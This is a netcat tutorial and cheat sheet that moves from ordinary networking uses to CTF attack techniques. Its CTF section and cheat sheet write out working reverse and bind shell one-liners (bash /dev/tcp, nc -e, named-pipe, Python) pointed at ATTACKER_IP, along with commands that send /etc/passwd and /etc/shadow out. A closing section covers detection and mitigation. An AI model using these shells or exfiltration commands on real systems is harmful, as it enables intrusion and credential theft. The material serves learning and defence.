# Netcat (nc) — The Swiss Army Knife of Networking

> **"Netcat is to networking what a Swiss Army knife is to tools — versatile, reliable, and always useful."**

---

## What is Netcat?

**Netcat** (abbreviated `nc`) is a command-line networking utility that reads and writes data across network connections using **TCP** or **UDP**. Originally written by Hobbit in 1995, it remains one of the most widely used tools by system administrators, penetration testers, and CTF players alike.

Its power comes from its **simplicity**: it does exactly what it's told — open a connection, send data, receive data. No more, no less. This minimalism makes it incredibly versatile as a building block for more complex operations.

---

## Core Concepts & Syntax

```
nc [options] [host] [port]
```

Netcat operates in two fundamental modes:

- **Client mode** — connects to a remote host on a port
- **Server/Listen mode** — binds to a local port and waits for incoming connections (`-l` flag)

### Basic Examples

```bash
# Connect to a host on port 80 (client mode)
nc example.com 80

# Listen on port 4444 (server mode)
nc -lvnp 4444

# Send a string to a host
echo "Hello" | nc example.com 9999

# UDP connection
nc -u 192.168.1.1 53
```

---

## Common Flags & Options

| Flag        | Description                                         |
| ----------- | --------------------------------------------------- |
| `-l`        | Listen mode (server)                                |
| `-v`        | Verbose output                                      |
| `-vv`       | Very verbose                                        |
| `-n`        | No DNS resolution (use IPs)                         |
| `-p [port]` | Specify source port                                 |
| `-u`        | Use UDP instead of TCP                              |
| `-e [cmd]`  | Execute command after connection (traditional/ncat) |
| `-c [cmd]`  | Execute shell command (alternative to `-e`)         |
| `-z`        | Zero-I/O mode (port scanning)                       |
| `-w [sec]`  | Timeout in seconds                                  |
| `-k`        | Keep listening after client disconnects (ncat)      |
| `-q [sec]`  | Quit after EOF + N seconds                          |
| `--ssl`     | Enable SSL/TLS (ncat only)                          |

---

## General / Professional Use Cases

### Port Scanning

Netcat can scan TCP and UDP ports quickly using the `-z` (zero I/O) flag.

```bash
# Scan a single port
nc -zv 192.168.1.1 22

# Scan a port range
nc -zvn 192.168.1.1 20-443

# UDP port scan
nc -zvu 192.168.1.1 53 161 162

# Scan with timeout (faster)
nc -zvn -w 1 192.168.1.1 1-1024
```

> 💡 For serious port scanning, prefer **Nmap** — but `nc` is useful for quick checks in restricted environments.

---

### Banner Grabbing

Banners reveal service versions and software info — essential for enumeration.

```bash
# HTTP banner
echo -e "HEAD / HTTP/1.0\r\n\r\n" | nc example.com 80

# SSH banner
nc -v 192.168.1.1 22

# SMTP banner
nc mail.example.com 25

# FTP banner
nc ftp.example.com 21
```

**Example output:**

```
SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5
```

---

### File Transfer

Netcat can transfer files over the network — no FTP, no SCP required.

```bash
# RECEIVER — listens and saves output to file
nc -lvnp 4444 > received_file.txt

# SENDER — connects and sends file
nc 192.168.1.2 4444 < file_to_send.txt

# Transfer with progress (using pv)
pv file.iso | nc 192.168.1.2 4444

# Transfer entire directory (using tar)
# Receiver
nc -lvnp 4444 | tar xvf -

# Sender
tar cvf - /path/to/dir | nc 192.168.1.2 4444
```

---

### Chat / Simple Messaging

A quick peer-to-peer terminal chat without any software:

```bash
# Machine A (listener)
nc -lvnp 5555

# Machine B (connects)
nc 192.168.1.1 5555
```

Both sides can now type messages back and forth in the terminal.

---

### Proxying & Relaying

Combine Netcat with named pipes to relay traffic between two hosts:

```bash
# Create a relay: forward port 8080 to port 80 on 10.0.0.1
mkfifo /tmp/relay
nc -lvnp 8080 < /tmp/relay | nc 10.0.0.1 80 > /tmp/relay
```

---

### Testing Network Services

```bash
# Send HTTP GET request manually
printf "GET / HTTP/1.1\r\nHost: example.com\r\n\r\n" | nc example.com 80

# Test SMTP connection
nc -v smtp.gmail.com 587

# Check if a port is open (simple)
nc -zv 10.0.0.1 443 && echo "Port open" || echo "Port closed"

# Test Redis
nc 127.0.0.1 6379
PING
# Expected: +PONG

# Test MySQL port availability
nc -zv 127.0.0.1 3306
```

---

## CTF Use Cases

In Capture The Flag competitions, Netcat is one of the most essential tools. Here are the most common patterns:

---

### Reverse Shells

A **reverse shell** makes the target machine connect _back_ to the attacker. This is crucial in CTFs where the target has no inbound ports exposed but can make outbound connections.

**Attacker (listener):**

```bash
nc -lvnp 4444
```

**Victim — Bash reverse shell:**

```bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```

**Victim — `/dev/tcp` variant (no nc needed on target):**

```bash
/bin/bash -c 'bash -i >& /dev/tcp/10.10.10.1/4444 0>&1'
```

**Victim — using `nc` with `-e` (traditional netcat):**

```bash
nc -e /bin/bash ATTACKER_IP 4444
```

**Victim — OpenBSD netcat (no `-e`) using named pipe:**

```bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc ATTACKER_IP 4444 > /tmp/f
```

**Victim — Python reverse shell:**

```python
python3 -c 'import socket,subprocess,os; \
  s=socket.socket(); s.connect(("ATTACKER_IP",4444)); \
  os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); \
  subprocess.call(["/bin/sh","-i"])'
```

---

### Bind Shells

A **bind shell** makes the target open a port and wait for the attacker to connect. Useful when you can reach the target but it can't reach you.

**Victim (listener):**

```bash
# Traditional nc
nc -lvnp 4444 -e /bin/bash

# OpenBSD nc (no -e)
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -lvnp 4444 > /tmp/f
```

**Attacker (connects):**

```bash
nc VICTIM_IP 4444
```

---

### Listening for Callbacks

In CTFs, many exploits (e.g., SSRF, RCE, XXE, XSS) require a server to receive a callback. Use `nc` to catch it:

```bash
# Listen for any incoming connection / data
nc -lvnp 80

# Listen for HTTP callback (useful for SSRF / XXE OOB)
nc -lvnp 8080

# Keep listening for multiple connections (ncat)
ncat -lvnp 4444 --keep-open
```

---

### Exfiltrating Data

Once you have a shell on a CTF box, you can exfiltrate files quickly:

```bash
# On attacker — receive the file
nc -lvnp 9001 > loot.txt

# On victim — send the file
nc ATTACKER_IP 9001 < /etc/passwd

# Exfiltrate /etc/shadow
nc ATTACKER_IP 9001 < /etc/shadow

# Base64 encode first (avoid binary issues)
base64 /path/to/binary | nc ATTACKER_IP 9001
# Decode on attacker side
nc -lvnp 9001 | base64 -d > binary_file
```

---

### Port Forwarding in CTFs

When you've compromised a machine in a network and need to reach an internal service:

```bash
# Forward local port 8888 to internal target 192.168.1.100:80
# (on the compromised machine)
mkfifo /tmp/pipe
nc -lvnp 8888 < /tmp/pipe | nc 192.168.1.100 80 > /tmp/pipe

# Now attacker can reach the internal service via
# nc COMPROMISED_IP 8888
```

---

## Netcat vs Ncat vs Socat

|Feature|`nc` (OpenBSD)|`nc` (Traditional)|`ncat`|`socat`|
|---|---|---|---|---|
|`-e` flag|❌|✅|✅|N/A|
|SSL/TLS|❌|❌|✅|✅|
|IPv6|✅|❌|✅|✅|
|Proxy support|❌|❌|✅|✅|
|UDP|✅|✅|✅|✅|
|Multiple connections (`-k`)|❌|❌|✅|✅|
|Port forwarding|Manual|Manual|✅|✅|
|Available on most systems|✅|✅|Needs Nmap|Separate install|

---

## Persistence & Automation Tips

### Upgrade a Dumb Shell (CTF Tip)

After catching a reverse shell, it may be non-interactive (no tab completion, Ctrl+C kills it). Upgrade it:

```bash
# On the victim shell
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Then on attacker
# Ctrl+Z to background
stty raw -echo; fg
# Press Enter twice

# Set terminal size
export TERM=xterm
stty rows 40 cols 150
```

### Scripted Port Check

```bash
#!/bin/bash
HOST="10.10.10.1"
for PORT in 21 22 23 25 80 443 3306 8080; do
  nc -zv -w 1 $HOST $PORT 2>&1 | grep -E "open|refused"
done
```

---

## Defense & Detection

Understanding how Netcat is detected helps both defenders and ethical hackers.

### Detection Methods

- **Process monitoring** — Watch for `nc`, `ncat`, `netcat` in running processes
- **Network monitoring** — Unusual outbound connections, especially on high ports (4444, 1234, 9001)
- **SIEM rules** — Alert on `nc -e /bin/sh` or similar command patterns
- **File integrity** — Monitor for creation of named pipes (`/tmp/f`, `/tmp/pipe`)
- **Firewall** — Block outbound connections on non-standard ports

### Blue Team Indicators of Compromise (IoCs)

```bash
# Check for listening nc processes
ss -tlnp | grep nc
netstat -tlnp | grep nc

# Find running nc instances
ps aux | grep -E "\bnc\b|\bnetcat\b|\bncat\b"

# Check for suspicious named pipes
find /tmp /var/tmp -type p 2>/dev/null
```

### Mitigations

- Restrict outbound firewall rules (whitelist approach)
- Use EDR solutions that detect shell spawning from network tools
- Monitor and alert on `/dev/tcp` usage in bash
- Use application allowlisting on servers

---

## Cheat Sheet

```
╔══════════════════════════════════════════════════════════════════╗
║                    NETCAT CHEAT SHEET                           ║
╠══════════════════════════════════════════════════════════════════╣
║  LISTEN                                                         ║
║  nc -lvnp 4444                  Basic listener                  ║
║  ncat -lvnp 4444 --keep-open    Multi-connection listener       ║
╠══════════════════════════════════════════════════════════════════╣
║  CONNECT                                                        ║
║  nc 10.10.10.1 4444             Connect to host:port            ║
║  nc -u 10.10.10.1 53            UDP connection                  ║
╠══════════════════════════════════════════════════════════════════╣
║  SCAN                                                           ║
║  nc -zvn 10.10.10.1 1-1024      TCP port range scan             ║
║  nc -zvu 10.10.10.1 53          UDP scan                        ║
╠══════════════════════════════════════════════════════════════════╣
║  FILE TRANSFER                                                  ║
║  nc -lvnp 4444 > file           Receive file                    ║
║  nc 10.10.10.1 4444 < file      Send file                       ║
╠══════════════════════════════════════════════════════════════════╣
║  REVERSE SHELL (Attacker listens)                               ║
║  nc -lvnp 4444                  Attacker                        ║
║  bash -i >& /dev/tcp/IP/4444 0>&1  Victim (bash)               ║
║  nc -e /bin/bash IP 4444        Victim (traditional nc)         ║
╠══════════════════════════════════════════════════════════════════╣
║  BIND SHELL (Victim listens)                                    ║
║  nc -lvnp 4444 -e /bin/bash     Victim                          ║
║  nc VICTIM_IP 4444              Attacker                        ║
╠══════════════════════════════════════════════════════════════════╣
║  BANNER GRAB                                                    ║
║  echo "" | nc -v HOST 80        HTTP banner                     ║
║  nc HOST 22                     SSH banner                      ║
╚══════════════════════════════════════════════════════════════════╝
```

---

_Documentation written for educational and professional use. Always obtain proper authorization before using these techniques on any system or network you do not own._